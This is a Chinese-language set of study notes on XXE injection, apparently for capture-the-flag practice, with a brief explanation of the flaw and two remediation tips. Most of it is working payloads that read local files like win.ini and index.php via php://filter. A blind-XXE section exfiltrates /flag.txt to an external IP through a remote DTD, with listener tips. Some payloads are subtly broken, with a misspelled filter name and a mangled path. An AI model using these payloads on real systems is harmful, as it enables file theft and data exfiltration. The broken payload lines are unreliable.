# XXE（XML外部实体注入）基础

```
<?xml version = "1.0"?>  //xml头
<!DOCTYPE note[ <!ENTITY cc "aa"> ]>  //主体
<na>&cc;</na>  //xml
```

xml中的标签是可以任意命名的



## XXE漏洞原理

XML（可扩展标记语言）是一种常用于Web应用程序的数据格式。XML文档可以定义实体，它们是存储文档中其他地方重复使用的数据的方式。外部实体是一种特殊类型的实体，它们的内容被定义在XML文档外部。

XXE漏洞发生在当应用程序解析含有外部实体引用的XML文档时，没有正确地限制或禁止这些外部实体的使用。攻击者可以利用这一点，通过构造包含恶意外部实体的XML文档，来实现攻击目的。


## 修复建议

1. 使用开发语言提供的禁用外部实体的方法。确保在解析XML前禁用DTD（文档类型定义）和禁止外部实体的解析。
2. 过滤用户提交的XML数据，特别是对于嵌入XML或DTD的输入，进行严格的验证和过滤，确保它们不包含对外部实体或不安全的结构的引用。



# 有回显，外部实体XXE

```
<?xml version = "1.0"?>
<!DOCTYPE note[ <!ENTITY cc "aa"> ]>
<na>&cc;</na>
```

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY f SYSTEM "file:///C://Windows//win/ini"> ]>
<x>&f;</x>
```

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "file:///C://Windows//win/ini"> ]>
<user><username>&admin;</username><password> admin</password></user> 
```

php伪协议文件读取

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php"> ]>
<user><username>&admin;</username><password> admin</password></user> 
```



# 无回显，外部实体，XXE

xml payload

```html
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY % remote SYSTEM "http://123.60.57.4/test.dtd">
%remote;%dtd;%xxe;
]>
```

先执行remote实体，再在该服务器中的test.dtd文件中执行dtd实体，再执行xxe实体



在服务器上/var/www/html下创建test.dtd文件

```
<!ENTITY % file SYSTEM "php://filter/read=convert-base64.encode/resource=/flag.txt">
//这里的文件读取也可以换成其他伪协议，如http,file
<!ENTITY % dtd "<!ENTITY xxe SYSTEM 'http://123.60.57.4/pass=%file;'>">
```

```
<!ENTITY % file SYSTEM "https://127.0.0.1/flag.php">
<!ENTITY % dtd "<!ENTITY xxe SYSTEM 'http://123.60.57.4/pass=%file;'>">
```

<!-- &#x25; 就是百分号（&#x25; vps=% vps），因为是嵌套在里面的引用，不能直接写百分号 -->
<!-- 如果选择nc监听的话，端口一定要加！！！ -->
<!-- 如果选择看日志的话，端口一定不能加！！！ -->

